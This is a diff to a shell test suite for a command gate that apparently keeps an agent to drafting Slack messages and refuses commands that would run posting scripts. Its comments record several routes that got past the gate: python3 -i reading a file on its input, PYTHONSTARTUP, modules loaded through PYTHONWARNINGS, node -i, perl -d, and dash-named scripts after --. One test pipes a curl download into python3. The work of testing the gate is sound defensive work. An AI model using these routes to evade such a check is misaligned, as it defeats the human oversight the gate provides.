@@ -36,7 +36,12 @@
 #     typed (claude-config#3441; the cases and what was measured are at the end);
 #   * python3 handed a folder as its own script, or a script handed one, is judged by the
 #     __main__.py the folder runs, and python3 handed an archive, a path under one, or a folder
-#     whose __main__ is not text, is refused as unread where typed (claude-config#3441).
+#     whose __main__ is not text, is refused as unread where typed (claude-config#3441);
+#   * what python3 given -i is fed on its input, the module a PYTHONWARNINGS value names, the file
+#     PYTHONSTARTUP names, and a file whose name starts with a dash where the program reads no
+#     more options (after --, a lone dash or the script, for a shell and every interpreter), are
+#     each read, and so is the input of node given -i and of perl given -d (claude-config#3600;
+#     the cases and what was measured are at the end).
 set -uo pipefail
 
 # Its own wall clock, and whatever it starts stopped with it however it ends (claude-config#465).
@@ -1006,6 +1011,205 @@ if grep -q 'def py_cmdline' "$DIR/lib/py-file-runs.py"; then
 else
   check "#3539 the reading of python3's own options is there to be made to fail" "lib/py-file-runs.py defines no py_cmdline, so a command is not read as python3 reads its options"
 fi
+
+echo "slack drafts only: input run after -i, a module PYTHONWARNINGS loads, and a script named with a leading dash (claude-config#3600)"
+
+# Measured on main at e4cf5e9919 on 2026-11-25, in this harness, against what python3 3.14.4 and
+# 3.9.6, node 22.22.2, perl 5.34.1, ruby 2.6.10, bash 3.2.57, zsh 5.9, dash and ksh themselves ran
+# with stand in scripts that only wrote a marker (one run of each shape; the two pythons agree on
+# every shape): every command below that runs something that posts was allowed.
+#   * `python3 -i quiet.py < posts.py` ran quiet.py and then the lines of posts.py: with -i among
+#     its own options, python3 goes on to run its input once the script, the code given by -c or
+#     the module given by -m ends, fed from a file, a pipe, a here string or a heredoc. The gate
+#     read that input as data the script is handed. -i after the script, -Wi (which is -W with the
+#     value i) and PYTHONINSPECT alone ran nothing from the input.
+#   * `PYTHONSTARTUP=startup.py python3 -i` ran startup.py, as it did with a file fed on the input;
+#     with a script, code or a module to run, python3 left it alone.
+#   * `node -i -e 1 < post.js` ran the lines of post.js, with -i or --interactive before or after
+#     the code, and `perl -d -e 1 < post.pl` those of post.pl, the debugger reading its commands
+#     from the input where there is no terminal. Without -i or -d neither ran its input.
+#   * `PYTHONPATH=onpath PYTHONWARNINGS=error::warnmod.Loud python3 quiet.py` imported warnmod
+#     before quiet.py ran, as the -W option does (#3539): from PYTHONPATH, for each filter of a
+#     comma separated list, with spaces around its fields.
+#   * `bash -- -sends.sh` and `bash - -sends.sh` ran the file named -sends.sh, as sh, zsh, dash and
+#     ksh did; so did `source -- -sends.sh`, `bash < -sends.sh`, `ruby -- -post.rb`, `perl --
+#     -post.pl` and `bun -- -post.js`, and a script that runs the file it is handed, handed one.
+#     No word starting with a dash was read as a file, and `source -- sends.sh` read the word --
+#     for the file, so no file at all.
+# What is held: each is refused, in words that name the route, and its twin, the same words where
+# nothing that runs posts, passes; a word starting with a dash where the program reads its own
+# options is still an option.
+H="$T/g3600"
+mkdir -p "$H/onpath"
+cp "$IP/posts.py" "$H/posts.py"
+cp "$IP/quiet.py" "$H/quiet.py"
+cp "$IP/quiet.py" "$H/quietmod.py"
+cp "$IP/posts.py" "$H/startup3600.py"
+cp "$IP/quiet.py" "$H/calmstart3600.py"
+cp "$IP/posts.py" "$H/-post.py"
+cp "$IP/quiet.py" "$H/-quiet.py"
+cp "$O/onpath/warnmod.py" "$H/onpath/warnmod.py"
+cp "$O/onpath/calmwarn.py" "$H/onpath/calmwarn.py"
+cp "$O/onpath/warnmod.py" "$H/herewarn.py"
+cp "$O/onpath/calmwarn.py" "$H/herecalm.py"
+cp "$O/handed.py" "$H/handed.py"
+# Under names no other suite's fixtures use, as sends3539.sh is above.
+cp "$IP/post.sh" "$H/sends3600.sh"
+cp "$IP/calm.sh" "$H/calm3600.sh"
+cp "$IP/post.sh" "$H/-sends3600.sh"
+cp "$IP/calm.sh" "$H/-calm3600.sh"
+cp "$IP/post.sh" "$H/-x"
+printf '%s\n' 'bash -- "$1"' > "$H/runs3600.sh"
+printf '%s\n' 'python3 quiet.py' > "$H/runpy3600.sh"
+printf '%s\n' 'python3 -i quiet.py < posts.py' > "$H/runi3600.sh"
+printf '%s\n' 'python3 -i quiet.py < quiet.py' > "$H/runicalm3600.sh"
+for ext in js rb pl; do
+  cp "$O/post.$ext" "$H/post.$ext"
+  cp "$O/calm.$ext" "$H/calm.$ext"
+  cp "$O/post.$ext" "$H/-post.$ext"
+  cp "$O/calm.$ext" "$H/-calm.$ext"
+done
+h_run() { run_at "$1" "${2:-$H}"; }
+h_pair() { # h_pair <what> <a command that runs something that posts> <its twin, where nothing it runs posts>
+  h_run "$2"
+  read_refused "#3600 $1 is refused"
+  h_run "$3"
+  allowed "#3600 $1, where nothing it runs posts, passes"
+}
+
+# python3 given -i runs its input once what it was given to run ends.
+h_pair "a script given -i, a file that posts fed on its input" "python3 -i quiet.py < posts.py" "python3 -i quiet.py < quiet.py"
+h_run "python3 -i quiet.py < posts.py"
+says "#3600 and the refusal names the option" "-i"
+says "#3600 and the file" "posts.py"
+h_pair "-i last in a run of letters" "python3 -Bi quiet.py < posts.py" "python3 -Bi quiet.py < quiet.py"
+h_pair "-i first in a run of letters" "python3 -iB quiet.py < posts.py" "python3 -iB quiet.py < quiet.py"
+h_pair "-i after -W and its value" "python3 -W ignore -i quiet.py < posts.py" "python3 -W ignore -i quiet.py < quiet.py"
+h_pair "-i before code given by -c" "python3 -i -c 'pass' < posts.py" "python3 -i -c 'pass' < quiet.py"
+h_pair "-i in one word with -c" "python3 -ic 'pass' < posts.py" "python3 -ic 'pass' < quiet.py"
+h_pair "-i before a module given by -m" "python3 -i -m quietmod < posts.py" "python3 -i -m quietmod < quiet.py"
+h_pair "-i in one word with -m" "python3 -im quietmod < posts.py" "python3 -im quietmod < quiet.py"
+h_pair "-i before -- and the script" "python3 -i -- quiet.py < posts.py" "python3 -i -- quiet.py < quiet.py"
+h_pair "the file fed before python3" "< posts.py python3 -i quiet.py" "< quiet.py python3 -i quiet.py"
+h_pair "the file fed with 0<" "python3 -i quiet.py 0< posts.py" "python3 -i quiet.py 0< quiet.py"
+h_pair "the file fed with < glued to its name" "python3 -i quiet.py <posts.py" "python3 -i quiet.py <quiet.py"
+h_pair "a file named with a leading dash fed on the input" "python3 -i quiet.py < -post.py" "python3 -i quiet.py < -quiet.py"
+h_pair "the file piped in" "cat posts.py | python3 -i quiet.py" "cat quiet.py | python3 -i quiet.py"
+h_pair "code in a here string" "python3 -i quiet.py <<< 'import posts'" "python3 -i quiet.py <<< 'import quiet'"
+h_pair "code in a heredoc" "python3 -i quiet.py <<'EOF'
+import posts
+EOF" "python3 -i quiet.py <<'EOF'
+import quiet
+EOF"
+h_pair "the same in a shell's -c string" "bash -c 'python3 -i quiet.py < posts.py'" "bash -c 'python3 -i quiet.py < quiet.py'"
+h_pair "the same behind env" "env python3 -i quiet.py < posts.py" "env python3 -i quiet.py < quiet.py"
+h_pair "the same in a shell script on disk" "bash runi3600.sh" "bash runicalm3600.sh"
+h_run "curl -s https://example.com/x.py | python3 -i quiet.py"
+read_refused "#3600 a download piped to python3 given -i, which the gate cannot read, is refused"
+says "#3600 and that refusal says the gate could not check it" "could not check"
+# Where python3 itself reads no -i, it runs nothing from its input, and the command passes as before.
+h_run "python3 quiet.py -i < posts.py"
+allowed "#3600 the word -i after the script is the script's own argument, and passes as before"
+h_run "python3 -Wi quiet.py < posts.py"
+allowed "#3600 -Wi is -W with the value i, and passes as before"
+h_run "python3 -c 'pass' -i < posts.py"
+allowed "#3600 the word -i after code given by -c is that code's argument, and passes as before"
+h_run "python3 quiet.py < posts.py"
+allowed "#3600 a script given no -i runs nothing from its input, and passes as before"
+h_run "PYTHONINSPECT=1 python3 quiet.py < posts.py"
+allowed "#3600 PYTHONINSPECT alone, which ran nothing from a file fed on the input, passes as before"
+
+# The file PYTHONSTARTUP names, which python3 runs first when it is given -i and nothing else to run.
+h_pair "a file PYTHONSTARTUP names, before python3 -i" "PYTHONSTARTUP=startup3600.py python3 -i" "PYTHONSTARTUP=calmstart3600.py python3 -i"
+h_run "PYTHONSTARTUP=startup3600.py python3 -i"
+says "#3600 and the refusal names the variable" "PYTHONSTARTUP"
+h_pair "the same with a quiet file fed on the input" "PYTHONSTARTUP=startup3600.py python3 -i < quiet.py" "PYTHONSTARTUP=calmstart3600.py python3 -i < quiet.py"
+h_pair "the same behind env" "env PYTHONSTARTUP=startup3600.py python3 -i" "env PYTHONSTARTUP=calmstart3600.py python3 -i"
+h_pair "the same exported first" "export PYTHONSTARTUP=startup3600.py; python3 -i" "export PYTHONSTARTUP=calmstart3600.py; python3 -i"
+h_run "PYTHONSTARTUP=\"\$X3600\" python3 -i"
+read_refused "#3600 a PYTHONSTARTUP value the gate cannot work out is refused as unread"
+says "#3600 and that refusal says the gate could not check it" "could not check"
+
+# node given -i with code, and perl given -d, run their input after it.
+h_pair "node given -i and code by -e" "node -i -e '1' < post.js" "node -i -e '1' < calm.js"
+h_run "node -i -e '1' < post.js"
+says "#3600 and the refusal names the file" "post.js"
+h_pair "node given -i after the code" "node -e '1' -i < post.js" "node -e '1' -i < calm.js"
+h_pair "node given --interactive" "node --interactive -e '1' < post.js" "node --interactive -e '1' < calm.js"
+h_pair "node given -i and code by -p" "node -i -p '1' < post.js" "node -i -p '1' < calm.js"
+h_pair "a file piped to node given -i" "cat post.js | node -i -e '1'" "cat calm.js | node -i -e '1'"
+h_run "node -e '1' < post.js"
+allowed "#3600 node given code and no -i runs nothing from its input, and passes as before"
+h_pair "perl given -d and code by -e" "perl -d -e 1 < post.pl" "perl -d -e 1 < calm.pl"
+h_pair "perl given -d in one word with -e" "perl -de 1 < post.pl" "perl -de 1 < calm.pl"
+h_run "perl -e 1 < post.pl"
+allowed "#3600 perl given code and no -d runs nothing from its input, and passes as before"
+
+# PYTHONWARNINGS names a warning class by its module as -W does, and python3 imports that module.
+h_pair "PYTHONWARNINGS naming a class in a module that posts" "PYTHONPATH=onpath PYTHONWARNINGS=error::warnmod.Loud python3 quiet.py" "PYTHONPATH=onpath PYTHONWARNINGS=error::calmwarn.Loud python3 quiet.py"
+h_run "PYTHONPATH=onpath PYTHONWARNINGS=error::warnmod.Loud python3 quiet.py"
+says "#3600 and the refusal names the variable" "PYTHONWARNINGS"
+says "#3600 and the module" "warnmod"
+h_pair "that value before code given by -c" "PYTHONPATH=onpath PYTHONWARNINGS=error::warnmod.Loud python3 -c 'pass'" "PYTHONPATH=onpath PYTHONWARNINGS=error::calmwarn.Loud python3 -c 'pass'"
+h_pair "that value before a module given by -m" "PYTHONPATH=onpath PYTHONWARNINGS=error::warnmod.Loud python3 -m quietmod" "PYTHONPATH=onpath PYTHONWARNINGS=error::calmwarn.Loud python3 -m quietmod"
+h_pair "the second filter of a list" "PYTHONPATH=onpath PYTHONWARNINGS=ignore,error::warnmod.Loud python3 quiet.py" "PYTHONPATH=onpath PYTHONWARNINGS=ignore,error::calmwarn.Loud python3 quiet.py"
+h_pair "a filter in quotes with spaces around its fields" "PYTHONPATH=onpath PYTHONWARNINGS=' error :: warnmod.Loud ' python3 quiet.py" "PYTHONPATH=onpath PYTHONWARNINGS=' error :: calmwarn.Loud ' python3 quiet.py"
+h_pair "the variable given by env" "env PYTHONPATH=onpath PYTHONWARNINGS=error::warnmod.Loud python3 quiet.py" "env PYTHONPATH=onpath PYTHONWARNINGS=error::calmwarn.Loud python3 quiet.py"
+h_pair "the variable exported first" "export PYTHONPATH=onpath PYTHONWARNINGS=error::warnmod.Loud; python3 quiet.py" "export PYTHONPATH=onpath PYTHONWARNINGS=error::calmwarn.Loud; python3 quiet.py"
+h_pair "the variable assigned, then exported" "PYTHONPATH=onpath; PYTHONWARNINGS=error::warnmod.Loud; export PYTHONPATH PYTHONWARNINGS; python3 quiet.py" "PYTHONPATH=onpath; PYTHONWARNINGS=error::calmwarn.Loud; export PYTHONPATH PYTHONWARNINGS; python3 quiet.py"
+h_pair "the variable exported before the PYTHONPATH that finds the module" "export PYTHONWARNINGS=error::warnmod.Loud; PYTHONPATH=onpath python3 quiet.py" "export PYTHONWARNINGS=error::calmwarn.Loud; PYTHONPATH=onpath python3 quiet.py"
+h_pair "the variable before a shell's -c string" "PYTHONPATH=onpath PYTHONWARNINGS=error::warnmod.Loud bash -c 'python3 quiet.py'" "PYTHONPATH=onpath PYTHONWARNINGS=error::calmwarn.Loud bash -c 'python3 quiet.py'"
+h_pair "the variable before a shell script on disk" "PYTHONPATH=onpath PYTHONWARNINGS=error::warnmod.Loud bash runpy3600.sh" "PYTHONPATH=onpath PYTHONWARNINGS=error::calmwarn.Loud bash runpy3600.sh"
+h_pair "a module in the folder PYTHONPATH names as ." "PYTHONPATH=. PYTHONWARNINGS=error::herewarn.Loud python3 quiet.py" "PYTHONPATH=. PYTHONWARNINGS=error::herecalm.Loud python3 quiet.py"
+h_run "PYTHONWARNINGS=ignore python3 quiet.py"
+allowed "#3600 a PYTHONWARNINGS value naming no class passes"
+h_run "PYTHONWARNINGS=error::DeprecationWarning python3 quiet.py"
+allowed "#3600 a PYTHONWARNINGS value naming a built in warning passes"
+h_run "PYTHONWARNINGS=ignore::nosuchmodule3600.Loud python3 quiet.py"
+allowed "#3600 a PYTHONWARNINGS value naming a class in a module found nowhere passes"
+h_run "PYTHONWARNINGS=\"\$X3600\" python3 quiet.py"
+read_refused "#3600 a PYTHONWARNINGS value the gate cannot work out is refused as unread"
+says "#3600 and that refusal says the gate could not check it" "could not check"
+
+# A script whose name starts with a dash, where the program reads no more options of its own.
+h_pair "a shell script named with a leading dash after --" "bash -- -sends3600.sh" "bash -- -calm3600.sh"
+h_run "bash -- -sends3600.sh"
+says "#3600 and the refusal names the script" "-sends3600.sh"
+h_pair "that script after a lone dash, which ends a shell's options too" "bash - -sends3600.sh" "bash - -calm3600.sh"
+h_pair "that script after an option and --" "bash -e -- -sends3600.sh" "bash -e -- -calm3600.sh"
+h_pair "that script handed to sh" "sh -- -sends3600.sh" "sh -- -calm3600.sh"
+h_pair "that script handed to sh after a lone dash" "sh - -sends3600.sh" "sh - -calm3600.sh"
+h_pair "that script handed to zsh" "zsh -- -sends3600.sh" "zsh -- -calm3600.sh"
+h_pair "that script handed to dash" "dash -- -sends3600.sh" "dash -- -calm3600.sh"
+h_pair "that script handed to ksh" "ksh -- -sends3600.sh" "ksh -- -calm3600.sh"
+h_pair "that script in quotes" "bash -- '-sends3600.sh'" "bash -- '-calm3600.sh'"
+h_pair "that script through a variable" "F=-sends3600.sh; bash -- \"\$F\"" "F=-calm3600.sh; bash -- \"\$F\""
+h_pair "that script with a quiet file after it" "bash -- -sends3600.sh calm3600.sh" "bash -- -calm3600.sh calm3600.sh"
+h_pair "that script in a shell's -c string" "bash -c 'bash -- -sends3600.sh'" "bash -c 'bash -- -calm3600.sh'"
+h_pair "that script behind env" "env bash -- -sends3600.sh" "env bash -- -calm3600.sh"
+h_pair "that script fed on a shell's input" "bash < -sends3600.sh" "bash < -calm3600.sh"
+h_pair "that script fed with < glued to its name" "bash <-sends3600.sh" "bash <-calm3600.sh"
+h_pair "that script sourced after --" "source -- -sends3600.sh" "source -- -calm3600.sh"
+h_pair "that script sourced with a dot after --" ". -- -sends3600.sh" ". -- -calm3600.sh"
+h_pair "a script of any name sourced after --" "source -- sends3600.sh" "source -- calm3600.sh"
+h_pair "a script of any name sourced with a dot after --" ". -- sends3600.sh" ". -- calm3600.sh"
+h_pair "a shell script that runs the file it is handed, handed one named with a dash" "bash runs3600.sh -sends3600.sh" "bash runs3600.sh -calm3600.sh"
+h_pair "the same script run by its path" "./runs3600.sh -sends3600.sh" "./runs3600.sh -calm3600.sh"
+h_pair "a Python script that runs the file it is handed, handed one named with a dash" "python3 handed.py -post.py" "python3 handed.py -quiet.py"
+h_pair "a ruby script named with a leading dash after --" "ruby -- -post.rb" "ruby -- -calm.rb"
+h_pair "a perl script named with a leading dash after --" "perl -- -post.pl" "perl -- -calm.pl"
+h_pair "a script named with a leading dash handed to bun after --" "bun -- -post.js" "bun -- -calm.js"
+h_pair "the same handed to bun run" "bun run -- -post.js" "bun run -- -calm.js"
+h_pair "the same handed to deno run" "deno run -- -post.js" "deno run -- -calm.js"
+h_pair "the same handed to node" "node -- -post.js" "node -- -calm.js"
+# A word starting with a dash where the program still reads its own options is an option, whatever
+# file shares its name; after the script it is the script's argument, read as a file it is handed.
+h_run "bash -x calm3600.sh"
+allowed "#3600 an option before the script is not read as the file of the same name"
+h_run "bash calm3600.sh -x"
+allowed "#3600 a file named with a dash, handed to a script that runs nothing, passes"
+h_run "bash runs3600.sh -x"
+read_refused "#3600 the same file handed to a script that runs what it is handed is refused"
 
 echo
 
